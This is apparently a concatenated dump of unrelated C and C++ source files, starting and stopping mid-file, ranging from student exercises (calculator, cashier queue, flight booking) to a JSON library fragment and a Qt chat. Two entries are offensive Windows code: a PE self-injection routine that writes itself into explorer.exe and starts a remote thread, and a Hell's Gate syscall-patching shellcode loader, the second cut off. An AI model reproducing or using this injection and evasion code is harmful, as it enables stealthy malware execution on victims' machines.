{\n            out += \"\\\\b\";\n        } else if (ch == '\\f') {\n            out += \"\\\\f\";\n        } else if (ch == '\\n') {\n            out += \"\\\\n\";\n        } else if (ch == '\\r') {\n            out += \"\\\\r\";\n        } else if (ch == '\\t') {\n            out += \"\\\\t\";\n        } else if (static_cast<uint8_t>(ch) <= 0x1f) {\n            char buf[8];\n            snprintf(buf, sizeof buf, \"\\\\u%04x\", ch);\n            out += buf;\n        } else if (static_cast<uint8_t>(ch) == 0xe2 && static_cast<uint8_t>(value[i+1]) == 0x80\n                   && static_cast<uint8_t>(value[i+2]) == 0xa8) {\n            out += \"\\\\u2028\";\n            i += 2;\n        } else if (static_cast<uint8_t>(ch) == 0xe2 && static_cast<uint8_t>(value[i+1]) == 0x80\n                   && static_cast<uint8_t>(value[i+2]) == 0xa9) {\n            out += \"\\\\u2029\";\n            i += 2;\n        } else {\n            out += ch;\n        }\n    }\n    out += '\"';\n}\n\nstatic void dump(const Json::array &values, string &out) {\n    bool first = true;\n    out += \"[\";\n    for (const auto &value : values) {\n        if (!first)\n            out += \", \";\n        value.dump(out);\n        first = false;\n    }\n    out += \"]\";\n}\n\nstatic void dump(const Json::object &values, string &out) {\n    bool first = true;\n    out += \"{\";\n    for (const auto &kv : values) {\n        if (!first)\n            out += \", \";\n        dump(kv.first, out);\n        out += \": \";\n        kv.second.dump(out);\n        first = false;\n    }\n    out += \"}\";\n}\n\nvoid Json::dump(string &out) const {\n    m_ptr->dump(out);\n}\n\n/* * * * * * * * * * * * * * * * * * * *\n * Value wrappers\n */\n\ntemplate <Json::Type tag, typename T>\nclass Value : public JsonValue {\nprotected:\n\n    // Constructors\n    explicit Value(const T &value) : m_value(value) {}\n    explicit Value(T &&value)      : m_value(std::move(value)) {}\n\n    // Get type tag\n    Json::Type type() const override {\n        return tag;\n    }\n\n    // Comparisons\n    bool equals(const JsonValue * other) const override {\n        return m_value == static_cast<const Value<tag, T> *>(other)->m_value;\n    }\n    bool less(const JsonValue * other) const override {\n        return m_value < static_cast<const Value<tag, T> *>(other)->m_value;\n    }\n\n    const T m_value;\n    void dump(string &out) const override { lottiejson11::dump(m_value, out); }\n};\n\nclass JsonDouble final : public Value<Json::NUMBER, double> {\n    double ",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main () {\n\t//var\n\tint op,num1,num2,resultado,resto;\n\tfloat resultadoDiv;\n\tchar opcao [30] = \"SIM\";\n\t\n\t//la\u00e7o de re\n\twhile(strcmp(opcao, \"SIM\") == 0) {\n\n\n\t//interface\n\tprintf(\"-------------------------------------------------------\\n\");\n\tprintf(\"SELECIONE O NUMERO RESPECTIVO PARA A OPERACAO DESEJADA:\\n\");\n\tprintf(\"[1] - ADICAO\\n\");\n\tprintf(\"[2] - SUBTRACAO\\n\");\n\tprintf(\"[3] - MULTIPLICACAO\\n\");\n\tprintf(\"[4] - DIVISAO\\n\");\n\tprintf(\"-------------------------------------------------------\\n\");\n\t\n\t//entrada de dados\n\tprintf(\"Informe a operacao que deseja realizar:\\n\");\n\tscanf(\"%d\",&op);\n\tprintf(\"Informe o primeiro numero:\\n\");\n\tscanf(\"%d\",&num1);\n\tprintf(\"Informe o segundo numero:\\n\");\n\tscanf(\"%d\",&num2);\n\t\n\t//cases\n\tswitch (op) {\n\t\tcase 1:\n\t\t\tresultado = num1 + num2;\n\t\t\tprintf(\"Resultado da operacao: %d\\n\",resultado);\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tresultado = num1 - num2;\n\t\t\tprintf(\"Resultado da operacao: %d\\n\",resultado);\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tresultado = num1 * num2;\n\t\t\tprintf(\"Resultado da operacao: %d\\n\",resultado);\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\tresultadoDiv = num1 / num2;\n\t\t\tresto = num1 % num2;\n\t\t\tif (resto != 0) {\n\t\t\t\tprintf(\"DIVISAO NAO EXATA!\\n\");\n\t\t\t} else {\n\t\t\t\tprintf(\"Resultado da operacao: %.1f\\n\",resultadoDiv);\n\t\t\t}\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tprintf(\"DADO INVALIDO\\n\");\n\t\t\tbreak;\n\t}\n\n\t//verificando o desejo do usu\u00e1rio\n\tprintf(\"Deseja continuar? Escreva em mai\u00fasculo\\n\");\n\tscanf(\"%s\",&opcao);\n\n\t//limpando o console\n\tsystem(\"cls\");\n\n}\n\tsystem(\"pause\");\n\treturn 0;\n}",
    "#include <iostream>\n#include <stack>\n#include <fstream>\nusing namespace std;\n\nstruct produk {\n    string nmProduk;\n    float hargaProduk;\n};\n\nstruct kasir {\n    string nmPembeli;\n    float uangSetor;\n    stack<produk> belanjaan;\n    kasir *next;\n};\n\nkasir *head = NULL, *tail = NULL, *cur = NULL;\n\nvoid buatAntrian(string namaPembeli, float uangPembeli, stack<produk> &keranjang);\nvoid tambahProduk(stack<produk> &keranjang, string nmProduk, float hargaProduk);\nvoid cetakAntrian();\nvoid printAntrianKe(int posisi, const string &filename);\n\nint main() {\n    system(\"cls\");\n    int brpAntrian;\n    cout << \"Selamat datang di (GH) Galau Habis Mart!\" << endl;\n    cout << \"Masukan jumlah antrian: \"; cin >> brpAntrian;\n    for (int i = 0; i < brpAntrian; i++) {\n        system(\"cls\");\n        string nmPembeli;\n        float uangSetor;\n        stack<produk> keranjang;\n        cout << \"Antrian ke-\" << i + 1 << endl;\n        cout << \"Masukan Nama Pembeli: \"; cin.ignore(); getline(cin, nmPembeli);\n\n        string nmProduk;\n        float hargaProduk;\n        char lanjutBelanja;\n        do {\n            cout << \"Masukan Nama Produk: \"; cin.ignore(); getline(cin, nmProduk);\n            cout << \"Masukan Harga Produk: \"; cin >> hargaProduk;\n            tambahProduk(keranjang, nmProduk, hargaProduk);\n\n            cout << \"Tambahkan Produk Belanjaan! ('Y'/'y'): \"; cin >> lanjutBelanja;\n        } while (lanjutBelanja == 'y' || lanjutBelanja == 'Y');\n\n        uangSetor = 0;\n        buatAntrian(nmPembeli, uangSetor, keranjang);\n    }\n\n    cetakAntrian();\n\n    int posisiCari;\n    cout << \"Masukkan posisi antrian yang ingin diprint (1-\" << brpAntrian << \"): \";\n    cin >> posisiCari;\n    string filename;\n    cout << \"Masukkan nama file untuk menyimpan hasil (contoh: strukBelanja.txt): \";\n    cin >> filename;\n\n    printAntrianKe(posisiCari, filename);\n\n    return 0;\n}\n\nvoid buatAntrian(string namaPembeli, float uangPembeli, stack<produk> &keranjang) {\n    kasir *antrianBaru = new kasir();\n    antrianBaru->nmPembeli = namaPembeli;\n    antrianBaru->uangSetor = uangPembeli;\n    antrianBaru->belanjaan = keranjang;\n    antrianBaru->next = NULL;\n\n    if (head == NULL) {\n        head = antrianBaru;\n        tail = head;\n    } else {\n        tail->next = antrianBaru;\n        tail = antrianBaru;\n    }\n}\n\nvoid tambahProduk(stack<produk> &keranjang, string nmProduk, float hargaProduk) {\n    produk belanjaan;\n    belanjaan.nmProduk = nmProduk;\n    belanjaan.hargaProduk = hargaProduk;\n    keranjang.push(belanjaan);\n}\n\nvoid cetakAntrian() {\n    system(\"cls\");\n    cur = head;\n    int i = 1;\n    while (cur != NULL) {\n        float totalBayar = 0;\n        cout << \"Antrian Ke-\" << i << endl;\n        cout << \"Nama Pembeli: \" << cur->nmPembeli << endl << endl;\n\n        if (!cur->belanjaan.empty()) {\n            cout << \"Isi Keranjang:\" << endl;\n            stack<produk> tempKeranjang = cur->belanjaan;\n            while (!tempKeranjang.empty()) {\n                produk curProduk = tempKeranjang.top();\n                cout << curProduk.nmProduk << \" Rp.\" << curProduk.hargaProduk << endl;\n                totalBayar += curProduk.hargaProduk;\n                tempKeranjang.pop();\n            }\n        } else {\n            cout << \"Keranjang Kosong!\" << endl;\n            cout << \"-----------------\" << endl << endl;\n        }\n\n        cout << \"\\nTotal Harga Belanja Rp.\" << totalBayar << endl;\n        do {\n            cout << \"Uang yg di Setor: \"; cin >> cur->uangSetor;\n            if(cur->uangSetor < totalBayar) {\n                cout << \"Uang Setor Kurang COK!\" << endl;\n            }\n        } while(cur->uangSetor < totalBayar);\n\n        float kembalian = cur->uangSetor - totalBayar;\n        cout << \"Uang kembalian Rp.\" << kembalian << endl << endl;\n        cout << \"-----------------\" << endl << endl;\n        cur = cur->next;\n        i++;\n    }\n}\n\nvoid printAntrianKe(int posisi, const string &filename) {\n    cur = head;\n    int urutan = 1;\n    ofstream printAntrian(filename);\n\n    if (!printAntrian) {\n        cerr << \"File tidak dapat dibuka!\" << endl;\n        return;\n    }\n\n    while (cur != NULL) {\n        if (urutan == posisi) {\n            printAntrian << \"Antrian Ke-\" << urutan << endl;\n            printAntrian << \"Nama Pembeli: \" << cur->nmPembeli << endl << endl;\n\n            float totalBayar = 0;\n            if (!cur->belanjaan.empty()) {\n                printAntrian << \"Isi Keranjang:\" << endl;\n                stack<produk> tempKeranjang = cur->belanjaan;\n                while (!tempKeranjang.empty()) {\n                    produk curProduk = tempKeranjang.top();\n                    printAntrian << curProduk.nmProduk << \" Rp.\" << curProduk.hargaProduk << endl;\n                    totalBayar += curProduk.hargaProduk;\n                    tempKeranjang.pop();\n                }\n            } else {\n                printAntrian << \"Keranjang Kosong!\" << endl;\n            }\n\n            printAntrian << \"\\nTotal Harga Belanja Rp.\" << totalBayar << endl;\n           ",
    "#include <fstream>\n#include <iostream>\n#include <string>\nusing namespace std;\n\nint main()\n{\n    string baris;\n\n    // membuka file dalam mode menulis\n    ofstream outfile;\n    // menunjuk ke sebuah nama file\n    outfile.open(\"contohfile.txt\");\n\n    cout << \">= Menulis file, \\'q\\' untuk keluar\" << endl;\n\n    // unlimited loop untuk menulis\n    while (true)\n    {\n        cout << \"- \";\n        //mendapatkan setiap karakter dalam satu baris\n        getline(cin, baris);\n        //loop akan berhenti jika anda memasukan karakter q\n        if (baris == \"q\") break;\n        //menulis dan memasukan nilai dari 'baris' ke dalam file\n        outfile << baris << endl;\n    }\n    // selesai dalam menulis skrg tutup filenya\n    outfile.close();\n\n    //membuka file dalam mode membaca\n    ifstream infile;\n    //menunjuk ke sebuah file\n    infile.open(\"contohfile.txt\");\n\n    cout << endl << \">= membuka dan membaca file \" << endl;\n    // jika file ada maka\n    if (infile.is_open())\n    {\n        // melakukan perulangan setiap baris\n        while (getline(infile, baris))\n        {\n            //dan tampilkan disini\n            cout << baris << '\\n';\n        }\n        //tutup file tersebut setelah selesai\n        infile.close();\n    }\n    //jika tidak ditemukan file maka akan menampilkan ini\n    else cout << \"unable to open file\";\n    return 0;\n}",
    "#include \"vsqtproject.h\"\n\nvsqtproject::vsqtproject(QWidget* parent, QString name)\n    : QMainWindow(parent)\n{\n    ui.setupUi(this);\n    myname = name;\n    this->port = 80;\n    this->udpSocket = new QUdpSocket(this);\n    udpSocket->bind(port, QUdpSocket::ShareAddress | QUdpSocket::ReuseAddressHint);\n    //\u7ed1\u5b9a\u7aef\u53e3\n    //\u91c7\u7528shareAddress\u6a21\u5f0f(\u5373\u5141\u8bb8\u5176\u4ed6\u7684\u670d\u52a1\u5668\u8fde\u63a5\u5230\u76f8\u540c\u7684\u5730\u5740\u548c\u7aef\u53e3)\n    //\u7279\u522b\u662f\u7528\u5728\u591a\u5ba2\u6237\u7aef\u76d1\u542c\u540c\u4e00\u670d\u52a1\u5668\u7aef\u53e3\u7b49\u65f6\u7279\u522b\u6709\u6548\uff09\uff0c\u8fd8\u6709ReuseAddressHint\u6a21\u5f0f(\u91cd\u65b0\u8fde\u63a5\u670d\u52a1\u5668)\n    //\u76d1\u542c\u4fe1\u53f7\n}\n\nQString vsqtproject::getName()\n{\n    return this->myname;\n}\n\nQString vsqtproject::getMsg()\n{\n    QString msg = ui.msgTxtEdit->toHtml();//\u8fd4\u56de\u8f93\u5165\u6846\u7684\u5185\u5bb9\n    ui.msgTxtEdit->clear();//\u5c06\u5185\u5bb9\u6e05\u7a7a\n    ui.msgTxtEdit->setFocus();//\u8bbe\u7f6e\u5149\u6807\n    return msg;\n}\n\nvoid vsqtproject::sndMsg(vsqtproject::Msgtype type)\n{\n    QByteArray array;\n    QDataStream stream(&array, QIODevice::WriteOnly);\n\n    stream << type << this->getName();//\u6d41\u5165\u7c7b\u578b\u548c\u7528\u6237\u540d\u79f0\n\n    switch (type) {\n    case Msg:\n        if (ui.msgTxtEdit->toPlainText() == \"\")\n        {\n            QMessageBox::warning(this, \"warnging\", \"Your send information is empty\");\n            return;\n        }\n        stream << this->getMsg();\n        break;\n    case UserEnter:\n        break;\n    case UserLeft:\n        break;\n    }\n    //\u4e66\u5199\u62a5\u6587\n    udpSocket->writeDatagram(array.data(), array.size(), QHostAddress::Broadcast, this->port);\n}\n\nvoid vsqtproject::ReceiveMessage()\n{\n\n}\n\nvoid vsqtproject::closeEvent(QCloseEvent*)\n{\n    emit this->closeWidget();\n}\n\nvsqtproject::~vsqtproject()\n{}\n",
    "#include <cstdio>\r\n#include <Windows.h>\r\n#include <tlhelp32.h>\r\n\r\ntypedef struct BASE_RELOCATION_ENTRY {\r\n    USHORT Offset : 12;\r\n    USHORT Type   :  4;\r\n} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;\r\n\r\n// Variable in which the main file is stored.\r\nWCHAR moduleName[128] = L\"\";\r\n\r\nDWORD InjectionEntryPoint() {\r\n    // To delete a file, you must let it stand for a little time before deleting it.\r\n    Sleep(1000);\r\n\r\n    DeleteFileW(moduleName);\r\n    return 0;\r\n}\r\n\r\nDWORD GetProcessId(const wchar_t *ProcessName) {\r\n    PROCESSENTRY32W pe32;\r\n    HANDLE hSnapshot = NULL;\r\n    pe32.dwSize = sizeof(PROCESSENTRY32W);\r\n    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\r\n\r\n    if (Process32FirstW(hSnapshot, &pe32)) {\r\n        do {\r\n            if (!wcscmp(pe32.szExeFile, ProcessName)) break;\r\n        } while(Process32NextW(hSnapshot, &pe32));\r\n    }\r\n\r\n    if (hSnapshot != INVALID_HANDLE_VALUE) CloseHandle(hSnapshot);\r\n\r\n    return pe32.th32ProcessID;\r\n}\r\n\r\nBOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {\r\n    TOKEN_PRIVILEGES tp;\r\n    LUID luid;\r\n\r\n    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) return FALSE;\r\n\r\n    tp.PrivilegeCount = 1;\r\n    tp.Privileges[0].Luid = luid;\r\n    if (bEnablePrivilege) tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\r\n    else tp.Privileges[0].Attributes = 0;\r\n\r\n    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL)) return FALSE;\r\n\r\n    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) return FALSE;\r\n\r\n    return TRUE;\r\n}\r\n\r\nBOOL GetDebugPrivileges() {\r\n    HANDLE hToken = NULL;\r\n    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) return FALSE;\r\n    if (!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE)) return FALSE;\r\n    return TRUE;\r\n}\r\n\r\nint main() {\r\n    GetDebugPrivileges();\r\n\r\n    DWORD ProcessId = GetProcessId(L\"explorer.exe\");\r\n\r\n    // Get Current PE File name.\r\n    GetModuleFileNameW(NULL, moduleName, sizeof(moduleName));\r\n\r\n    PVOID imageBase = GetModuleHandle(NULL);\r\n    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;\r\n    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);\r\n    PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);\r\n    memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);\r\n    HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, ProcessId);\r\n\r\n    PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\r\n    DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;\r\n    PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);\r\n    DWORD relocationEntriesCount = 0;\r\n    PDWORD_PTR patchedAddress;\r\n    PBASE_RELOCATION_ENTRY relocationRVA = NULL;\r\n    while (relocationTable->SizeOfBlock > 0) {\r\n        relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);\r\n        relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);\r\n        for (DWORD i = 0; i < relocationEntriesCount; i++) {\r\n            if (relocationRVA[i].Offset) {\r\n                patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);\r\n                *patchedAddress += deltaImageBase;\r\n            }\r\n        }\r\n        relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);\r\n    }\r\n\r\n    WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL);\r\n    CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + deltaImageBase), NULL, 0, NULL);\r\n\r\n    return 0;\r\n}",
    "#include \"TicketAgent.h\"\n#include <iostream>\n#include <fstream>\n\nTicketAgent::TicketAgent(std::string uid, std::string pwd) : User(uid, pwd) {}\n\nvoid TicketAgent::displayMenu() const {\n    std::cout << \"Ticket Agent Menu:\\n\";\n    std::cout << \"1. Search Flight\\n\";\n    std::cout << \"2. Book Ticket\\n\";\n    std::cout << \"3. Save Bookings\\n\";\n    std::cout << \"4. Load Bookings\\n\";\n    std::cout << \"5. Exit\\n\";\n}\n\nvoid TicketAgent::searchFlight(const std::vector<Flight>& flights) const {\n    std::string origin, destination;\n    std::cout << \"Enter Origin: \";\n    std::cin >> origin;\n    std::cout << \"Enter Destination: \";\n    std::cin >> destination;\n\n    bool found = false;\n    for (const auto& flight : flights) {\n        if (flight.getOrigin() == origin && flight.getDestination() == destination) {\n            std::cout << \"Flight ID: \" << flight.getFlightID() << \"\\n\";\n            std::cout << \"Plane ID: \" << flight.getPlaneID() << \"\\n\";\n            std::cout << \"Departure Time: \" << flight.getDepartureTime() << \"\\n\";\n            std::cout << \"Arrival Time: \" << flight.getArrivalTime() << \"\\n\";\n            std::cout << \"Price: \" << flight.getPrice() << \"\\n\";\n            found = true;\n        }\n    }\n    if (!found) {\n        std::cout << \"No flights found from \" << origin << \" to \" << destination << \".\\n\";\n    }\n}\n\nvoid TicketAgent::bookTicket(std::vector<Booking>& bookings, const std::vector<Flight>& flights) {\n    std::string bookingID, flightID, passengerName, seatNumber, paymentDetails, reservationExpiryDate;\n    std::cout << \"Enter Booking ID: \";\n    std::cin >> bookingID;\n    std::cout << \"Enter Flight ID: \";\n    std::cin >> flightID;\n\n    bool flightExists = false;\n    for (const auto& flight : flights) {\n        if (flight.getFlightID() == flightID) {\n            flightExists = true;\n            break;\n        }\n    }\n\n    if (!flightExists) {\n        std::cout << \"Flight ID not found.\\n\";\n        return;\n    }\n\n    std::cout << \"Enter Passenger Name: \";\n    std::cin >> passengerName;\n    std::cout << \"Enter Seat Number: \";\n    std::cin >> seatNumber;\n    std::cout << \"Enter Payment Details: \";\n    std::cin >> paymentDetails;\n    std::cout << \"Enter Reservation Expiry Date: \";\n    std::cin >> reservationExpiryDate;\n\n    Booking newBooking(bookingID, flightID, passengerName, seatNumber, paymentDetails, reservationExpiryDate);\n    bookings.push_back(newBooking);\n\n    // Write the new booking to bookings.txt\n    std::ofstream outFile(\"bookings.txt\", std::ios::app); // Open file in append mode\n    if (outFile.is_open()) {\n        newBooking.saveToFile(outFile);\n        outFile.close();\n        std::cout << \"Ticket booked and saved successfully.\\n\";\n    }\n    else {\n        std::cerr << \"Unable to open file for writing.\\n\";\n    }\n}\n\nvoid TicketAgent::saveBookingsToFile(const std::string& filename, const std::vector<Booking>& bookings) const {\n    std::ofstream outFile(filename);\n    if (outFile.is_open()) {\n        for (const auto& booking : bookings) {\n            booking.saveToFile(outFile);\n        }\n        outFile.close();\n        std::cout << \"Bookings saved successfully to \" << filename << \"\\n\";\n    }\n    else {\n        std::cerr << \"Unable to open file for writing.\\n\";\n    }\n}\n\nvoid TicketAgent::loadBookingsFromFile(const std::string& filename, std::vector<Booking>& bookings) {\n    std::ifstream inFile(filename);\n    if (inFile.is_open()) {\n        bookings.clear();\n        while (inFile.peek() != EOF) {\n            Booking booking;\n            booking.loadFromFile(inFile);\n            bookings.push_back(booking);\n        }\n        inFile.close();\n        std::cout << \"Bookings loaded successfully from \" << filename << \"\\n\";\n    }\n    else {\n        std::cerr << \"Unable to open file for reading.\\n\";\n    }\n}\n",
    "#include <pybind11/pybind11.h>\n#include <pybind11/eigen.h>\n#include <Eigen/Sparse>\n\nnamespace py = pybind11;\n\nEigen::SparseMatrix<double> pruneSNN(Eigen::SparseMatrix<double> snnMatrix, double prune = 0) {\n\tif (prune <= 0) {\n\t\treturn snnMatrix;\n\t}\n\n\tfor (int i = 0; i < snnMatrix.outerSize(); i++) {\n\t\tfor (Eigen::SparseMatrix<double>::InnerIterator it(snnMatrix, i); it; ++it) {\n\t\t\tif (it.value() <= prune) {\n\t\t\t\tit.valueRef() = 0;\n\t\t\t}\n\t\t}\n\t}\n\n\tsnnMatrix.prune(0.0); // actually remove pruned values\n\n\treturn snnMatrix;\n}\n\nEigen::SparseMatrix<double> computeSNN(Eigen::SparseMatrix<double> &nnMatrix, int k, double prune = 0) {\n\tEigen::SparseMatrix<double> SNN = nnMatrix * (nnMatrix.transpose());\n\n\tfor (int i = 0; i < SNN.outerSize(); i++) {\n\t\tfor (Eigen::SparseMatrix<double>::InnerIterator it(SNN, i); it; ++it) {\n\t\t\tit.valueRef() = it.value()/(k + (k - it.value()));\n\t\t\tif (prune <= 0) {\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tif (it.value() <= prune) {\n\t\t\t\tit.valueRef() = 0;\n\t\t\t}\n\t\t}\n\t}\n\n\tif (prune > 0) {\n \t \tSNN.prune(0.0); // actually remove pruned values\n\t}\n\n\treturn(SNN);\n}\n\npy::dict getNNmatrix(Eigen::MatrixXi nnRanked, int k = -1, int start = 0, double prune = 0) {\n\tint nRows = nnRanked.rows(), nCols = nnRanked.cols();\n\n    py::dict result;\n    \n\tif (k == -1 || k > nCols) {\n\t\tk = nCols;\n\t}\n\n\tif (start + k > nCols) {\n\t\tk = nCols - start;\n\t}\n\n\t// std::cout << nRows << ' ' << nCols << ' ' << k << '\\n';\n    std::vector<Eigen::Triplet<double>> tripletList;\n  \ttripletList.reserve(nRows * k);\n    \n    for (int j = start; j < start + k; j++) {\n\t\tfor (int i = 0; i < nRows; i++) {\n\t\t\ttripletList.push_back(Eigen::Triplet<double>(i, nnRanked(i, j) - 1, 1));\n        }\n    }\n\n    Eigen::SparseMatrix<double> NN(nRows, nRows);\n\tNN.setFromTriplets(tripletList.begin(), tripletList.end());\n\n\tif (prune < 0) {\n        result[\"nn\"] = NN;\n\t\treturn result;\n\t}\n\t\n    \n    result[\"nn\"] = NN;\n    result[\"snn\"] = computeSNN(NN, k, prune);\n    \n    return result;\n}\n\n\nPYBIND11_MODULE(snn_functions, m) {\n    m.def(\"computeSNN\", &computeSNN, \"A function that computes the SNN matrix\");\n\tm.def(\"pruneSNN\", &pruneSNN, \"A function that prunes the SNN matrix\");\n\tm.def(\"getNNmatrix\", &getNNmatrix, \"A function that computes the SNN matrix\");\n}\n\n",
    "#include <Windows.h>\r\n#include <winternl.h>\r\n#include <ntstatus.h>\r\n#include <iostream>\r\n#include <fstream>\r\n#include <vector>\r\n#include <TlHelp32.h> // Added for thread snapshot functions\r\n\r\n// Ensure these are not redefined\r\n#undef _PEB\r\n#undef _PROCESS_BASIC_INFORMATION\r\n#undef _OSVERSIONINFOEXW\r\n\r\ntypedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(\r\n    HANDLE ProcessHandle,\r\n    PROCESSINFOCLASS ProcessInformationClass,\r\n    PVOID ProcessInformation,\r\n    ULONG ProcessInformationLength,\r\n    PULONG ReturnLength\r\n    );\r\n\r\ntypedef NTSTATUS(NTAPI* _NtProtectVirtualMemory)(\r\n    HANDLE ProcessHandle,\r\n    PVOID* BaseAddress,\r\n    PSIZE_T RegionSize,\r\n    ULONG NewProtect,\r\n    PULONG OldProtect\r\n    );\r\n\r\n// Function to find the syscall number using Hell's Gate\r\nDWORD FindSyscallNumber(LPCSTR functionName) {\r\n    HMODULE hNtdll = GetModuleHandleA(\"ntdll.dll\");\r\n    FARPROC funcAddr = GetProcAddress(hNtdll, functionName);\r\n    BYTE* pFunction = (BYTE*)funcAddr;\r\n\r\n    for (int i = 0; i < 0x20; i++) {\r\n        if (pFunction[i] == 0x0F && pFunction[i + 1] == 0x05) { // Look for \"syscall\"\r\n            DWORD ssn = *(DWORD*)(pFunction + i - 4); // The syscall number is 4 bytes before\r\n            return ssn;\r\n        }\r\n    }\r\n    return 0;\r\n}\r\n\r\nbool ModifyFunctionToSyscall(DWORD ssn, FARPROC funcAddr) {\r\n    BYTE* pFunction = reinterpret_cast<BYTE*>(funcAddr);\r\n    DWORD oldProtect;\r\n\r\n    if (VirtualProtect(pFunction, 10, PAGE_READWRITE, &oldProtect)) {\r\n        pFunction[0] = 0xB8;\r\n        *reinterpret_cast<DWORD*>(&pFunction[1]) = ssn;\r\n        pFunction[5] = 0x0F;\r\n        pFunction[6] = 0x05;\r\n        pFunction[7] = 0xC3;\r\n\r\n        VirtualProtect(pFunction, 10, PAGE_EXECUTE_READ, &oldProtect);\r\n        return true;\r\n    }\r\n    return false;\r\n}\r\n\r\nbool VerifyModification(FARPROC funcAddr, DWORD expectedSSN) {\r\n    BYTE* pFunction = reinterpret_cast<BYTE*>(funcAddr);\r\n    DWORD ssn = *reinterpret_cast<DWORD*>(&pFunction[1]);\r\n    return pFunction[0] == 0xB8 && ssn == expectedSSN;\r\n}\r\n\r\nDWORD GetCurrentSSN(FARPROC funcAddr) {\r\n    BYTE* pFunction = reinterpret_cast<BYTE*>(funcAddr);\r\n    return *reinterpret_cast<DWORD*>(&pFunction[1]);\r\n}\r\n\r\nvoid SetHardwareBreakpoint(FARPROC funcAddr, DWORD registerIndex) {\r\n    CONTEXT ctx = {};\r\n    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;\r\n\r\n    HANDLE hThread = GetCurrentThread();\r\n    GetThreadContext(hThread, &ctx);\r\n\r\n    (&ctx.Dr0)[registerIndex] = (DWORD_PTR)funcAddr;\r\n\r\n    ctx.Dr7 |= (1 << (2 * registerIndex));\r\n\r\n    SetThreadContext(hThread, &ctx);\r\n}\r\n\r\nvoid UpdateRAXandContinue(FARPROC funcAddr, DWORD newSSN) {\r\n    CONTEXT ctx = {};\r\n    ctx.ContextFlags = CONTEXT_CONTROL;\r\n\r\n    HANDLE hThread = GetCurrentThread();\r\n    GetThreadContext(hThread, &ctx);\r\n\r\n    ctx.Rax = newSSN;\r\n\r\n    ctx.Rip = (DWORD_PTR)funcAddr + 0x8;\r\n\r\n    SetThreadContext(hThread, &ctx);\r\n}\r\n\r\nint main() {\r\n    DWORD targetPID = 1608; // Replace with the PID of the process you want to inject\r\n\r\n    // Using Hell's Gate to find the SSN of NtAllocateVirtualMemory\r\n    DWORD ssnNtAllocateVirtualMemory = FindSyscallNumber(\"NtAllocateVirtualMemory\");\r\n    DWORD ssnNtDrawText = FindSyscallNumber(\"NtDrawText\");\r\n\r\n    std::cout << \"SSN of NtAllocateVirtualMemory: \" << ssnNtAllocateVirtualMemory << std::endl;\r\n    std::cout << \"SSN of NtDrawText: \" << ssnNtDrawText << std::endl;\r\n\r\n    FARPROC addrNtDrawText = GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtDrawText\");\r\n    std::cout << \"Address of NtDrawText: \" << addrNtDrawText << std::endl;\r\n\r\n    if (addrNtDrawText != nullptr) {\r\n        if (ModifyFunctionToSyscall(ssnNtAllocateVirtualMemory, addrNtDrawText) &&\r\n            VerifyModification(addrNtDrawText, ssnNtAllocateVirtualMemory)) {\r\n            std::cout << \"NtDrawText was successfully modified to use the SSN of NtAllocateVirtualMemory!\" << std::endl;\r\n            DWORD currentSSN = GetCurrentSSN(addrNtDrawText);\r\n            std::cout << \"The new SSN of NtDrawText is: \" << currentSSN << std::endl;\r\n        }\r\n        else {\r\n            std::cout << \"Failed to modify NtDrawText to use the SSN of NtAllocateVirtualMemory\" << std::endl;\r\n        }\r\n    }\r\n\r\n    // Load shellcode from a file\r\n    std::ifstream shellcodeFile(\"loader.bin\", std::ios::binary | std::ios::ate);\r\n    if (!shellcodeFile.is_open()) {\r\n        std::cerr << \"Failed to open shellcode file.\" << std::endl;\r\n        return 1;\r\n    }\r\n\r\n    std::streamsize fileSize = shellcodeFile.tellg();\r\n    shellcodeFile.seekg(0, std::ios::beg);\r\n\r\n    std::vector<char> shellcode(fileSize);\r\n    if (!shellcodeFile.read(shellcode.data(), fileSize)) {\r\n        std::cerr << \"Failed to read the shellcode from file.\" << std::endl;\r\n        return 1;\r\n    